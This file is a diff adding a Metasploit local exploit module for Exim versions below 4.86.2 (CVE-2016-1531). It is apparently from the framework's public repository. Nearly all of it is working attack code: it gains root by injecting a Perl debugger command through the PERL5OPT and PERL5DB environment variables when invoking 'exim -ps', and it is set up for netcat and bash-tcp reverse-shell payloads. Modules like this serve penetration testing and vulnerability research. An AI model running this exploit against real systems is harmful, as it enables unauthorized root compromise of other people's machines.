@@ -1,0 +1,59 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+
+  Rank = ExcellentRanking
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'            => 'Exim "perl_startup" Privilege Escalation',
+      'Description'     => %q{
+        This module exploits a Perl injection vulnerability in Exim < 4.86.2
+        given the presence of the "perl_startup" configuration parameter.
+      },
+      'Author'          => [
+        'Dawid Golunski', # Vulnerability discovery
+        'wvu'             # Metasploit module
+      ],
+      'References'      => [
+        %w{CVE 2016-1531},
+        %w{EDB 39549},
+        %w{URL http://www.exim.org/static/doc/CVE-2016-1531.txt}
+      ],
+      'DisclosureDate'  => 'Mar 10 2016',
+      'License'         => MSF_LICENSE,
+      'Platform'        => 'unix',
+      'Arch'            => ARCH_CMD,
+      'SessionTypes'    => %w{shell meterpreter},
+      'Privileged'      => true,
+      'Payload'         => {
+        'BadChars'      => "\x22\x27", # " and '
+        'Compat'        => {
+          'PayloadType' => 'cmd cmd_bash',
+          'RequiredCmd' => 'generic netcat netcat-e bash-tcp telnet'
+        }
+      },
+      'Targets'         => [
+        ['Exim < 4.86.2', {}]
+      ],
+      'DefaultTarget'   => 0
+    ))
+  end
+
+  def check
+    if exploit('whoami') == 'root'
+      CheckCode::Vulnerable
+    else
+      CheckCode::Safe
+    end
+  end
+
+  def exploit(c = payload.encoded)
+    # PERL5DB technique from http://perldoc.perl.org/perlrun.html
+    cmd_exec(%Q{PERL5OPT=-d PERL5DB='exec "#{c}"' exim -ps 2>&-})
+  end
+
+end
